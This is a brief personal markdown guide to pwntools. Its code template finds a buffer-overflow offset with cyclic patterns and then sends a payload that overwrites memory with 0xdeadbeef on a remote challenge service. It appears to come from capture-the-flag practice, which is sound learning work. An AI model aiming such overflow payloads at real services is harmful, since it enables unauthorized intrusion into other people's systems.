# PWNTools

# Description

This markdown serves as a personal guide for how to utilize some of pwntools functions. I hope that it can possibly help anyone interested, as it has helped me accomplish a few pentesting goals. Use with caution, discernment, and safety.

Download: pip install pwntools


```python

from pwn import *

exe = ELF(#path_to_executable_here)
conn = remote(URL, PORT) #Used for remote connection, most times through netcat

#Random string pattern of 500 characters 
pattern = cyclic(length=500, n=4) 

conn.sendlineafter(LINE OF CODE IN INTEREST, pattern)

#Receive following line in program after pattern has been inserted and overflow buffer
conn.recvline()

code = conn.recvline()
#Data manipulation in order to get proper output for code value
code = code.decode("utf-8")
code = code.partition('code == ')[2]
code = code.partition('0x')[2]
code = code.rstrip('\n')
code = int(code, base=16)

#Find the offset in memory where the part of the code exists,
#in context of challenge, offset would have been 254
offset = cyclic_find(code, n=4)


#Payload to send to vulnerable program
payload = fit ({offset:0xdeadbeef})


#Open connection again and send payload instead of pattern
conn = remote(URL, PORT)
conn.sendlineafter(LINE OF CODE IN INTEREST, payload)


#Buffer should now have an overflow will the value 0xDEADBEEF
#Modifiy this code and its functionality for specific purpose needed

